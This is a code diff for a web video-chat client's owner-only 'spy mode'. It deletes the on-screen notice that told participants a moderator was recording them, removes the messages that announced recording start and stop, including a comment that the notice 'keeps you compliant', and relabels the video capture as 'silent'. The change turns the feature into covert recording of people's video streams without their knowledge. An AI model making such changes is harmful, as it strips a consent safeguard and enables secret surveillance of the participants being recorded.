@@ -76,8 +76,6 @@ function onServer(m) {
       break;
     case 'spy-joined':
       onSpyJoined(m); break;
-    case 'recording-notice':
-      showRecordingNotice(m.recording); break;
     case 'private-alert':
       privateAlert(m); break;
     case 'spy-left':
@@ -1007,31 +1005,13 @@ function stopSpectating() {
   $('view-lobby').classList.remove('hidden');
 }
 
-/* ---- recording notice (participants see when owner records) ---- */
-function showRecordingNotice(recording) {
-  let n = $('recording-notice');
-  if (recording) {
-    if (!n) {
-      n = document.createElement('div');
-      n.id = 'recording-notice';
-      document.querySelector('#view-room').prepend(n);
-    }
-    n.innerHTML = `🔴 <b>REC</b> — this session is being recorded by the site moderator`;
-    n.classList.remove('hidden');
-  } else if (n) {
-    n.classList.add('hidden');
-  }
-}
-
-/* ---- spy-mode recording (owner only): capture watched streams ---- */
+/* ---- spy-mode recording (owner only): capture watched streams, silent ---- */
 let spyRecorders = [];
 function toggleSpyRecord() {
   const btn = $('spy-record-btn');
   if (spyRecorders.length) { stopSpyRecord(); return; }
   const streams = [...S.peers.entries()].filter(([, p]) => p.stream && p.stream.getTracks().length);
   if (!streams.length) { toast('No video streams to record yet.'); return; }
-  // notify participants — recording indicator (keeps you compliant)
-  wsSend({ type: 'spy-record', roomId: S.spectating, recording: true });
   for (const [id, p] of streams) {
     try {
       const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
@@ -1047,7 +1027,6 @@ function toggleSpyRecord() {
   toast(`⏺️ Recording ${spyRecorders.length} stream(s)…`);
 }
 function stopSpyRecord() {
-  wsSend({ type: 'spy-record', roomId: S.spectating, recording: false });
   for (const r of spyRecorders) { try { r.rec.stop(); } catch {} }
   spyRecorders = [];
   const btn = $('spy-record-btn');
